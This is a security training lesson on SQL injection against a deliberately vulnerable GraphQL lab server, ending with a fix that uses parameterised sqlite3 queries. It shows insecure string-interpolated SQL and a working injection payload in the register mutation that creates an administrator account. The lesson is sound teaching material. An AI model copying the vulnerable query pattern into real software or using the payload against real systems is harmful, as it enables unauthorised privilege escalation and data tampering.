---
title: 'SQL Injection'
description: 'While less common nowadays, SQL injections are still a threat. Learn how to exploit and prevent them.'
category: 'Injection'
points: 10
owasp: 'API8:2019'
introduction: true
authors: [escape]
---

A SQL injection is a common attack vector that allows an attacker to execute arbitrary SQL queries on a database. This can be used to steal data, modify data, or even execute arbitrary code on the database server. This lesson focuses on a privilege escalation attack leveraging a SQL injection.

This lesson comes with a GraphQL server offering a login and registration service. To start the server, run the following command:

- Install the dependencies with `npm install`
- Start the server with `npm start`. The server will start in development mode: it will restart automatically when you make changes to the code and the database will be reset at each restart.

A GraphQL IDE should open, allowing you to query the server.

## The vulnerability

The server offers a query, `users`, allowing to retrieve the list of users, and two mutations, `login` and `register`, allowing to authenticate and register new users.

Try creating an account with the following credentials:

```graphql
mutation {
  register(email: "user@example.com", password: "password1")
}
```

You can see that the user has been created by querying the list of users:

```graphql
query {
  users {
    email
    admin
  }
}
```

And you can authenticate with the following mutation:

```graphql
mutation {
  login(email: "user@example.com", password: "password1") {
    id
    email
    admin
  }
}
```

Our goal is to exploit the `register` mutation to create an administrator account. The code behind the `register` mutation is the following:

```js
db.run(
  `INSERT INTO users (email, password, admin) VALUES ('${email}', '${password}', 0)`,
  (err) => {
    // ...
  }
);
```

If you look closely, you can see that the email and password are directly injected into the SQL query. **This is a SQL injection vulnerability.** We can exploit it by including a string terminator `'` in the email, and then arbitrary SQL. For instance, registering with the following credentials:

```graphql
mutation {
  register(
    #                      v We include a string terminator in the email
    email: "eve@example.com', '$argon2id$v=19$m=1024,t=1,p=1$Q3FMVVlaNlNjc1dIZWlQcg$p8om9rk2ef3+uzO8Hg0Gwhnx1+1vIll2qDiiWBACrUw', 1); --"
    #                          ^ We provide a password hash compatible with the server                                            ^
    #                                                                                                  We set the admin flag to 1 |
    password: "password1"
  )
}
```

The resulting query will be: (with added newlines for readability)

```sql
INSERT INTO users (email, password, admin)
VALUES (
  'eve@example.com',
  '$argon2id$v=19$m=1024,t=1,p=1$Q3FMVVlaNlNjc1dIZWlQcg$p8om9rk2ef3+uzO8Hg0Gwhnx1+1vIll2qDiiWBACrUw',
  1
); --', '$argon2id$v=19$m=1024,t=1,p=1$T1p2cTlBa0lmVg$kaoMvhUXvLxKXisdaky0kGZU2hoKD5tncvkKQkANagU', 0)
```

You can see our malicious payload completely overriding the initial query. The `--` at the end of the query is a comment, allowing the resulting SQL to be valid. The comment contains the rest of the query, `', '${password}', 0)` in the JavaScript code above.

We can query the list of users again to see if our malicious account has been created:

```graphql
query {
  users {
    email
    admin
  }
}
```

It worked! We can now authenticate with our new account:

```graphql
mutation {
  login(email: "eve@example.com", password: "password1") {
    id
    email
    admin
  }
}
```

## Preventing SQL injections

There are many ways to prevent SQL injections. Most modern ORMs and database libraries will automatically escape the values you provide to prevent SQL injections. We use [sqlite3](https://www.npmjs.com/package/sqlite3) in this lesson, and it does feature an escaping mechanism: we use the `?` placeholder to escape the values we provide to the query, and provide the values separately as an array.

Replace the database functions in `src/database.js` with the following:

```js
export const createUser = async (email, password) =>
  new Promise((resolve, reject) => {
    db.run(
      // Use the ? placeholder to escape the values
      'INSERT INTO users (email, password, admin) VALUES (?, ?, 0)',
      // Provide the values as an array
      [email, password],
      (err) => {
        if (err) reject(err);
        else resolve(undefined);
      }
    );
  });

export const getUserByEmail = async (email) =>
  new Promise((resolve, reject) => {
    // Same here
    db.all('SELECT * FROM users WHERE email = ?', [email], (err, rows) => {
      if (err) reject(err);
      else resolve(rows[0]);
    });
  });
```

You can retry the attack, but this time it won't work: **our server is now safe from SQL injections!** It however still lacks proper validation mechanisms for the email, allowing us to register with an invalid email address, but this is the subject of another lesson.
